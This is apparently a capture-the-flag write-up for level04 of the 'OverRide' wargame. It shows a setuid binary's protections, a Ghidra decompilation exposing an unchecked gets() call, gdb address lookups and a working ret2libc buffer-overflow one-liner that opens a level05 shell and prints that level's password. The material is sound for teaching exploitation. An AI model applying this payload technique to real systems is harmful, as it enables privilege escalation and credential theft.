@@ -1,0 +1,95 @@
+RELRO                STACK CANARY        NX                   PIE             RPATH        RUNPATH         FILE
+Partial RELRO 🟡     No canary found 🔴   NX disabled 🔴      No PIE 🔴       No RPATH 🟢   No RUNPATH 🟢   /home/users/level04/level04
+-----
+level04@OverRide:~$ ls -la
+total 17
+dr-xr-x---+ 1 level04 level04   80 Sep 13  2016 .
+dr-x--x--x  1 root    root     260 Oct  2  2016 ..
+-rw-r--r--  1 level04 level04  220 Sep 10  2016 .bash_logout
+lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
+-rw-r--r--  1 level04 level04 3533 Sep 10  2016 .bashrc
+-rwsr-s---+ 1 level05 users   7797 Sep 10  2016 level04
+-rw-r--r--+ 1 level04 level04   41 Oct 19  2016 .pass
+-rw-r--r--  1 level04 level04  675 Sep 10  2016 .profile
+level04@OverRide:~$ ./level04 
+Give me some shellcode, k
+whoami
+child is exiting...
+level04@OverRide:~$ 
+
+------- ghidra -------
+undefined4 main(void)
+
+{
+  int iVar1;
+  char *pcVar2;
+  byte bVar3;
+  uint local_a4;
+  char local_a0 [128];
+  uint local_20;
+  uint local_1c;
+  long local_18;
+  int local_14;
+  
+  bVar3 = 0;
+  local_14 = fork();
+  pcVar2 = local_a0;
+  for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {
+    pcVar2[0] = '\0';
+    pcVar2[1] = '\0';
+    pcVar2[2] = '\0';
+    pcVar2[3] = '\0';
+    pcVar2 = pcVar2 + ((uint)bVar3 * -2 + 1) * 4;
+  }
+  local_18 = 0;
+  local_a4 = 0;
+  if (local_14 == 0) {
+    prctl(1,1);
+    ptrace(PTRACE_TRACEME,0,0,0);
+    puts("Give me some shellcode, k");
+    gets(local_a0);
+  }
+  else {
+    do {
+      wait(&local_a4);
+      local_20 = local_a4;
+      if (((local_a4 & 0x7f) == 0) ||
+         (local_1c = local_a4, '\0' < (char)(((byte)local_a4 & 0x7f) + 1) >> 1)) {
+        puts("child is exiting...");
+        return 0;
+      }
+      local_18 = ptrace(PTRACE_PEEKUSER,local_14,0x2c,0);
+    } while (local_18 != 0xb);
+    puts("no exec() for you");
+    kill(local_14,9);
+  }
+  return 0;
+}
+------- gdb -------
+level04@OverRide:~$ ./level04 
+Give me some shellcode, k
+
+child is exiting...
+level04@OverRide:~$ gdb -q ./level04
+Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.
+(gdb) break main
+Breakpoint 1 at 0x80486cd
+(gdb) run
+Starting program: /home/users/level04/level04 
+
+Breakpoint 1, 0x080486cd in main ()
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) find &system, +9999999, "/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+(gdb) 
+
+--------- final ---------
+level04@OverRide:~$ (python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "JUNK" + "\xec\x97\xf8\xf7"'; cat) | ./level04
+Give me some shellcode, k
+whoami
+level05
+cat /home/users/level05/.pass
+"3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN"
